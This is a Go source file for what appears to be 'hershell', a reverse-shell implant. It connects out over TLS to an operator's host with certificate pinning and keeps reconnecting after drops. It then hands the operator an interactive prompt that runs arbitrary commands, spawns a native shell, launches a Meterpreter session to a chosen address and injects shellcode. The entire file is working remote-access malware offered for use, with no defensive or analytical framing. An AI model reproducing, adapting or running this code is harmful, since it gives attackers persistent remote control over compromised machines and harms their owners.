package main

import (
	"bufio"
	"bytes"
	"crypto/sha256"
	"crypto/tls"
	"encoding/hex"
	"net"
	"os"
	"strings"
	"time"

	"github.com/lesnuages/hershell/meterpreter"
	"github.com/lesnuages/hershell/shell"
)

const (
	errCouldNotDecode  = 1 << iota
	errHostUnreachable = iota
	errBadFingerprint  = iota
)

var (
	connectString  string
	fingerPrint    string
	serverNotifier chan string
)

func interactiveShell(conn net.Conn) {
	var (
		exit    = false
		prompt  = "[hershell]> "
		scanner = bufio.NewScanner(conn)
	)

	conn.Write([]byte(prompt))

	for {
		// check connection health, if connecntion was closed, program should
		// try to rebuild new connnection

		peerCheck := scanner.Scan()
		if peerCheck == false {
			conn.Close()
			serverNotifier <- "remote_abnormal"
			return
		}

		command := scanner.Text()
		if len(command) > 1 {
			argv := strings.Split(command, " ")
			switch argv[0] {
			case "meterpreter":
				if len(argv) > 2 {
					transport := argv[1]
					address := argv[2]
					ok, err := meterpreter.Meterpreter(transport, address)
					if !ok {
						conn.Write([]byte(err.Error() + "\n"))
					}
				} else {
					conn.Write([]byte("Usage: meterpreter [tcp|http|https] IP:PORT\n"))
				}
			case "inject":
				if len(argv) > 1 {
					shell.InjectShellcode(argv[1])
				}
			case "exit":
				exit = true
			case "run_shell":
				conn.Write([]byte("Enjoy your native shell\n"))
				runShell(conn)
			default:
				shell.ExecuteCmd(command, conn)
			}

			if exit {
				break
			}

		}
		conn.Write([]byte(prompt))
	}
}

func runShell(conn net.Conn) {
	var cmd = shell.GetShell()
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Stdin = conn
	cmd.Run()
}

func checkKeyPin(conn *tls.Conn, fingerprint []byte) (bool, error) {
	valid := false
	connState := conn.ConnectionState()
	for _, peerCert := range connState.PeerCertificates {
		hash := sha256.Sum256(peerCert.Raw)
		if bytes.Compare(hash[0:], fingerprint) == 0 {
			valid = true
		}
	}
	return valid, nil
}

func reverse(connectString string, fingerprint []byte) {
	var (
		conn *tls.Conn
		err  error
	)
	config := &tls.Config{InsecureSkipVerify: true}

	for {
		if conn, err = tls.Dial("tcp", connectString, config); err != nil {
			time.Sleep(10 * time.Second)
		} else {
			break
		}
	}

	defer conn.Close()

	if ok, err := checkKeyPin(conn, fingerprint); err != nil || !ok {
		os.Exit(errBadFingerprint)
	}

	go interactiveShell(conn)

	for {
		select {
		case info := <-serverNotifier:
			if info == "remote_abnormal" {
				time.Sleep(3 * time.Second)
				reConn, err := tls.Dial("tcp", connectString, config)
				if err != nil {
					serverNotifier <- "remote_abnormal"
					continue
				}

				if ok, err := checkKeyPin(reConn, fingerprint); err != nil || !ok {
					os.Exit(errBadFingerprint)
				}
				interactiveShell(reConn)
			}
		}
	}
}

func main() {
	if connectString != "" && fingerPrint != "" {
		fprint := strings.Replace(fingerPrint, ":", "", -1)
		bytesFingerprint, err := hex.DecodeString(fprint)
		if err != nil {
			os.Exit(errCouldNotDecode)
		}

		serverNotifier = make(chan string, 1)
		reverse(connectString, bytesFingerprint)
	}
}
